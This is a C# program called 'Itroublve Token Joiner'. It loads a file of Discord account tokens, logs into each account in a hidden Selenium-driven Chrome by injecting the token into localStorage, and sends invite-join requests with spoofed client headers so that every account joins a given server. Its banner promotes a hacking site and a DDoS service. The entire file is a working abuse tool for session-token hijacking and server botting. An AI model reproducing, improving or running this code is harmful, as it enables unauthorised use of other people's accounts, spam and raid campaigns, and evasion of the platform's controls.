using OpenQA.Selenium.Chrome;
using System;
using System.Text.RegularExpressions;
using System.IO;

namespace TokenJoiner
{
    class Program
    {
        public static void Main()
        {
            Console.Title = "Itroublve Token Joiner";
            Console.ForegroundColor = ConsoleColor.White;
            Console.OutputEncoding = System.Text.Encoding.Unicode;
            Console.WriteLine($@"


     @@@   @@@@@@   @@@  @@@  @@@  @@@@@@@@  @@@@@@@   
     @@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  
     @@!  @@!  @@@  @@!  @@!@!@@@  @@!       @@!  @@@  
     !@!  !@!  @!@  !@!  !@!!@!@!  !@!       !@!  @!@  
     !!@  @!@  !@!  !!@  @!@ !!@!  @!!!:!    @!@!!@!   
     !!!  !@!  !!!  !!!  !@!  !!!  !!!!!:    !!@!@!    
     !!:  !!:  !!!  !!:  !!:  !!!  !!:       !!: :!!   
!!:  :!:  :!:  !:!  :!:  :!:  !:!  :!:       :!:  !:!  
::: : ::  ::::: ::   ::   ::   ::   :: ::::  ::   :::  
 : :::     : :  :   :    ::    :   : :: ::    :   : :  
                                                                                                    ");
            Console.WriteLine($@" ._______________________________________________.
 |                                               |
 | Official Website: https://itroublvehacker.ml  |
 | Special Human:    https://ichhackenet.de      |
 | Best DDoSer:      https://astro-hit.xyz       |
 |_______________________________________________|");
            Console.WriteLine(Environment.NewLine);
            Console.ResetColor();
            Console.WriteLine("Drag Token File: ");
            string token = Console.ReadLine();
            token = token.Replace("\"", "");
            if (!File.Exists(token))
            {
                Console.Clear();
                Console.WriteLine("Error: Token File Not Found");
                Main();
            }
            Console.WriteLine("Enter Invite: ");
            string invite = Console.ReadLine();

            invite = invite.Replace("discord.gg/", "");
            invite = invite.Replace("https://discord.com/invite/", "");
            invite = invite.Replace("https://discord.gg/", "");
            invite = invite.Replace("https://", "");
            string fun = $"{"\""}\\{"\""} Not A;Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"90\\\", \\\"Google Chrome\\\";v=\\\"90\\\"";
            var options = new ChromeOptions();
            Console.Clear(); Ascii();
            options.AddArgument("--no-sandbox");
            options.AddArgument("--window-position=-32000,-32000");
            options.AddArgument("--disable-gpu");
            options.AddArgument("--log-level=3");
            options.AddArgument("--disable-crash-reporter");
            options.AddArgument("--disable-extensions");
            options.AddArgument("--disable-in-process-stack-traces");
            options.AddArgument("--disable-logging");
            options.AddArgument("--disable-dev-shm-usage");
            var driver = new ChromeDriver(options);
            Console.Clear(); Ascii();
            foreach (Match match in Regex.Matches(File.ReadAllText(token), @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
            {
                driver.Navigate().GoToUrl("https://discord.com/login");
                string login = "(function() { window.gay = \"" + match.Value + "\"; window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage; window.setInterval(() => window.localStorage.token = `\"${window.gay}\"`);window.location.reload();})();";
                driver.ExecuteScript(login);
                driver.ExecuteScript("fetch(\"https://discord.com/api/v9/invites/" + invite + "\", {\"headers\": { \"accept\": \"*/*\", \"accept-language\": \"en-US\", \"authorization\":\"" + match.Value + "\", \"sec-ch-ua\":" + fun + "\", \"sec-ch-ua-mobile\": \"?0\",    \"sec-fetch-dest\": \"empty\",    \"sec-fetch-mode\": \"cors\",    \"sec-fetch-site\": \"same-origin\", \"x-context-properties\": \"eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjgyMDMyODI4NzAxMTQ3MTM5MCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4MjAzMjgyODcwMzI5NjcyMjkiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9\",\"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC44NSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTAuMC40NDMwLjg1Iiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3JlcGwuaXQvIiwicmVmZXJyaW5nX2RvbWFpbiI6InJlcGwuaXQiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9\"},  \"referrer\": \"https://discord.com/channels/@me\",  \"referrerPolicy\": \"strict-origin-when-cross-origin\",\"body\": null,\"method\": \"POST\",\"mode\": \"cors\",\"credentials\": \"include\"});");
            }
            driver.Close();
        }
        public static void Ascii()
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.OutputEncoding = System.Text.Encoding.Unicode;
            Console.WriteLine($@"


     @@@   @@@@@@   @@@  @@@  @@@  @@@@@@@@  @@@@@@@   
     @@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  
     @@!  @@!  @@@  @@!  @@!@!@@@  @@!       @@!  @@@  
     !@!  !@!  @!@  !@!  !@!!@!@!  !@!       !@!  @!@  
     !!@  @!@  !@!  !!@  @!@ !!@!  @!!!:!    @!@!!@!   
     !!!  !@!  !!!  !!!  !@!  !!!  !!!!!:    !!@!@!    
     !!:  !!:  !!!  !!:  !!:  !!!  !!:       !!: :!!   
!!:  :!:  :!:  !:!  :!:  :!:  !:!  :!:       :!:  !:!  
::: : ::  ::::: ::   ::   ::   ::   :: ::::  ::   :::  
 : :::     : :  :   :    ::    :   : :: ::    :   : :  
                                                                                                    ");
            Console.WriteLine($@" ._______________________________________________.
 |                                               |
 | Official Website: https://itroublvehacker.ml  |
 | Special Human:    https://ichhackenet.de      |
 | Best DDoSer:      https://astro-hit.xyz       |
 |_______________________________________________|");
            Console.WriteLine(Environment.NewLine);
        }
    }
}